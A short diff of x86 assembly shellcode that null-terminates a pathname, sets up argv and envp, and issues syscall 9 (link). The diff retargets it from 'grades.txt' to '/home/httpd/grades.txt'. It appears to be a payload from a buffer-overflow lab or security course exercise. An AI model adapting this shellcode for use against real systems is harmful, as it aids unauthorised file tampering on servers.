@@ -1,7 +1,7 @@
 #include <sys/syscall.h>
 
-#define STRING	"grades.txt"
-#define STRLEN	9
+#define STRING	"/home/httpd/grades.txt"
+#define STRLEN	22
 #define ARGV	(STRLEN+2)
 #define ENVP	(ARGV+4)
 
@@ -15,9 +15,7 @@
 	popl	%esi
 	movl	%esi,(ARGV)(%esi)	/* set up argv pointer to pathname */
 	xorl	%eax,%eax		    /* get a 32-bit zero value */
-	add     $0x01,%esi
 	movb	%al,(STRLEN)(%esi)	/* null-terminate our string */
-	sub     $0x01,%esi
 	movl	%eax,(ENVP)(%esi)	/* set up null envp */
 
 	movb    $0x09,%al			/* syscall arg 1: syscall number */
